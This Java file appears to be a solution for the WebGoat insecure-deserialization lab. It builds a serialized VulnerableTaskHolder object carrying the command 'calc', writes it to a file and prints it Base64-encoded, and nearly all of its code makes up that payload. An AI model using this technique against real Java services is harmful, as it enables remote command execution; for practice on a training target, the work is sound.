package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Attack {
    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder evilObj = new VulnerableTaskHolder("mob", "calc");

        // 将序列化数据写入文件
        FileOutputStream fos = new FileOutputStream("serial"); // D:\IDEAProjects\WebGoat\serial
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(evilObj);
        os.close();

        // 序列化到字节数组并 base64 编码
        String base64Encoded = serializeToBase64(evilObj);
        // 输出 Base64 编码的字符串
        System.out.println("Base64 Encoded Serialized Data:");
        System.out.println(base64Encoded);
    }

    // 获取 base64 编码后的序列化数据
    public static String serializeToBase64(Object evilObj) throws IOException {
        // 序列化到字节数组
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(evilObj);
        objectOutputStream.close();

        // 获取字节数组
        byte[] serializedBytes = byteArrayOutputStream.toByteArray();
        // Base64 编码
        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);

        return base64Encoded;
    }
}
